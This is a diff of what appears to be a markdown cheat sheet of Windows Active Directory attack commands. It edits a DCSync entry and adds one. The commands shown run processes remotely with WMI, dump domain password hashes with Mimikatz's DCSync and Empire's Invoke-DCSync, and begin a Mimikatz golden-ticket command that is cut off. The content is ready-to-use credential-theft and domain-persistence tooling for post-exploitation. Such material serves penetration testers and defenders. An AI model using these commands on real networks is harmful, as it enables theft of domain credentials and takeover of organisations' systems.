@@ -94,11 +94,17 @@ Input:
     PS> Invoke-WmiMethod -Path Win32_process -Name create -ComputerName <Computer Name> -ArgumentList calc.exe
     
 
-#Run dcsync with mimikatz
+#Run DCSync with mimikatz
     
     PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<username> /domain:<domain>"'
     
 
+#DCSync built-in to Mimikatz
+(https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/InvokeDCSync.ps1) 
+
+
+    PS> Invoke-DCSync –PWDumpFormat 
+    
 #Create a golden ticket file if needed for backup
     
     PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<sid> 
